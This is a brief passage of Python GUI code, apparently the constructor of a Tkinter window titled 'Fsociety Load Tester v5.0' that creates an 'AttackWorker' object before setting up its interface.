        self.root = root
        self.root.title("Fsociety Load Tester v5.0 - by Alexander K.")
        self.root.geometry("900x600")
        self.root.resizable(False, False)
        
        self.worker = AttackWorker()
        self.setup_ui()
        
    def setup_ui(self):
